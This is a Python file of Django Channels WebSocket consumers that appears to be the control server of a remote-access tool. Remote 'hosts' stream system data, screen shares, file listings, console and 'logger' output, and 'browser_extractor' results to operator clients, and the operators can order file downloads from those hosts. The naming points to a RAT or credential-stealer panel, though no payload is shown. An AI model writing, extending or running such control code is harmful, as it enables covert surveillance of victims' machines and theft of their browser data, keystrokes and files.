from channels.generic.websocket import AsyncWebsocketConsumer
import json
from .models import Host, HostConnection
from channels.db import database_sync_to_async
from django.utils import timezone
import os
import base64


class HostConnectionConsumer(AsyncWebsocketConsumer):
    connections = []

    def __init__(self, *args, **kwargs):
        super().__init__(self, *args, **kwargs)


    @database_sync_to_async
    def add_host_to_db(self, json_data):
        if not HostConnection.objects.filter(identifier = json_data['payload']['identifier'], connected_at__date = timezone.now().date()).exists():
            HostConnection.objects.create(
                identifier = json_data['payload']['identifier'],
                os = json_data['payload']['os'],
            )
        
        if not Host.objects.filter(identifier = json_data['payload']['identifier']).exists():
            Host.objects.create(
                hostname = json_data['payload']['hostname'],
                identifier = json_data['payload']['identifier'],
                os = json_data['payload']['os'],
                ip = json_data['payload']['ip'],
                port = self.scope['client'][1]
            )
        else:
            host = Host.objects.get(identifier = json_data['payload']['identifier'])
            host.ip = json_data['payload']['ip']
            host.port = self.scope['client'][1]
            host.connected_at = timezone.now()
            host.save()



    async def connect(self):
        await self.channel_layer.group_add(
            "host_connection_group",
            self.channel_name
        )
        await self.accept()
        self.connections.append({
            'host' : self.scope['client'][1],
            'obj' : self
        })
        print('[CONNECTED] : ', self.scope['client'][1])
        
    async def disconnect(self, close_code):
        for item in self.connections:
            if item['host'] == self.scope['client'][1]:
                self.connections.remove(item)
        print('[DISCONNECTED] : ', self.scope['client'][1])


    async def send_message(self, message):
        await self.send(text_data = json.dumps(message))


    async def receive(self, text_data):
        json_data = json.loads(text_data)
        if json_data['type'] == 'hostvitals':
            for item in self.connections:
                if item['host'] == self.scope['client'][1]:
                    item['hostvitals'] = json_data['payload']
                    await self.add_host_to_db(json_data)
        elif json_data['type'] == 'sysvitals':
            await self.channel_layer.group_send(
                    "client_connection_group",
                    {"type": "send_sysvitals", "sysvitals": json_data['payload']}
                )
        elif json_data['type'] == 'explorer':
            await self.channel_layer.group_send(
                    "client_connection_group",
                    {"type": "send_explorer", "explorer": json_data['payload']}
                )
        elif json_data['type'] == 'screenshare':
            await self.channel_layer.group_send(
                    "client_connection_group",
                    {"type": "send_screenshare", "screenshare": json_data['payload']}
                )
        elif json_data['type'] == 'upload_file':
            await self.channel_layer.group_send(
                    "explorer_connection_group",
                    {"type": "send_upload_file", "upload_file": json_data}
                )
        elif json_data['type'] == 'logger':
            await self.channel_layer.group_send(
                    "client_connection_group",
                    {"type": "send_logger", "logger": json_data['payload']}
                )
        elif json_data['type'] == 'console':
            await self.channel_layer.group_send(
                    "client_connection_group",
                    {"type": "send_console", "console": json_data['payload']}
                )
        elif json_data['type'] == 'browser_extractor':
            await self.channel_layer.group_send(
                    "client_connection_group",
                    {"type": "send_browser_extractor", "browser_extractor": json_data['payload']}
                )


    @classmethod
    def get_connected_hosts(cls):
        return cls.connections



class ClientConnectionConsumer(AsyncWebsocketConsumer):
    connections = []

    async def connect(self):
        await self.channel_layer.group_add(
            "client_connection_group",
            self.channel_name
        )

        await self.accept()
        # await self.send(text_data=json.dumps({
        #     'client' : str(self.scope['client'][1]),
        #     'data' : 'huehuehue'
        # }))

    async def send_sysvitals(self, event):
        await self.send(text_data=json.dumps({
            'client' : str(self.scope['client'][1]),
            'data' : event["sysvitals"]
        }))


    async def send_explorer(self, event):
        await self.send(text_data=json.dumps({
            'client' : str(self.scope['client'][1]),
            'data' : event["explorer"]
        }))


    async def send_screenshare(self, event):
        await self.send(text_data=json.dumps({
            'client' : str(self.scope['client'][1]),
            'data' : event["screenshare"]
        }))

    async def send_logger(self, event):
        await self.send(text_data=json.dumps({
            'client' : str(self.scope['client'][1]),
            'data' : event["logger"]
        }))

    async def send_console(self, event):
        await self.send(text_data=json.dumps({
            'client' : str(self.scope['client'][1]),
            'data' : event["console"]
        }))
    async def send_browser_extractor(self, event):
        await self.send(text_data=json.dumps({
            'client' : str(self.scope['client'][1]),
            'data' : event["browser_extractor"]
        }))


    @classmethod
    def get_connected_hosts(cls):
        return cls.connections
    


class ExplorerConnectionConsumer(AsyncWebsocketConsumer):
    connections = []

    async def connect(self):
        await self.channel_layer.group_add(
            "explorer_connection_group",
            self.channel_name
        )

        await self.accept()
        # await self.send(text_data=json.dumps({
        #     'client' : str(self.scope['client'][1]),
        #     'data' : 'huehuehue'
        # }))

    async def receive(self, text_data):
        await self.channel_layer.group_send(
            "host_connection_group",
            {"type": "send_message", "message": "download_file", "command" : text_data}
        )


    async def send_upload_file(self, event):
        await self.send(text_data=json.dumps({
            'client' : str(self.scope['client'][1]),
            'data' : event["upload_file"]
        }))


    @classmethod
    def get_connected_hosts(cls):
        return cls.connections
    


class AgentConnectionConsumer(AsyncWebsocketConsumer):
    connections = []

    def __init__(self, *args, **kwargs):
        super().__init__(self, *args, **kwargs)
        self.uploadFileChunks = []


    async def encode(self, binary_data):
        encoded_string = base64.b64encode(binary_data).decode('utf-8')
        return encoded_string


    async def decode(self, encoded_string):
        binary_data = base64.b64decode(encoded_string)
        return binary_data


    # async def store_file(self, filename):
    #     try:
    #         if not os.path.exists('agent_builds/data_files'):
    #             os.mkdir('agent_builds/data_files')

    #         with open(f'agent_builds/data_files/{filename}', 'wb') as file:
    #             for chunk in self.uploadFileChunks:
    #                 ch = await self.decode(chunk)
    #                 file.write(ch)
    #         self.uploadFileChunks.clear()
    #         await self.send(text_data=json.dumps({
    #             'client' : str(self.scope['client'][1]),
    #             'type': 'uploadFile',
    #             'payload' : 'success'
    #         }))
    #     except Exception as e:
    #         pass



    async def connect(self):
        await self.channel_layer.group_add(
            "agent_connection_group",
            self.channel_name
        )

        await self.accept()
        # await self.send(text_data=json.dumps({
        #     'client' : str(self.scope['client'][1]),
        #     'data' : 'huehuehue'
        # }))

    # async def receive(self, text_data):
    #     json_data = json.loads(text_data)
    #     if json_data['type'] == 'uploadFile':
    #         try:
    #             if not json_data['payload'] == 'EOF':
    #                 self.uploadFileChunks.append(json_data['payload'])
    #             else:
    #                 await self.store_file(json_data['filename'])
    #         except Exception as e:
    #             pass



    # async def send_upload_file(self, event):
    #     await self.send(text_data=json.dumps({
    #         'client' : str(self.scope['client'][1]),
    #         'data' : event["upload_file"]
    #     }))


    @classmethod
    def get_connected_hosts(cls):
        return cls.connections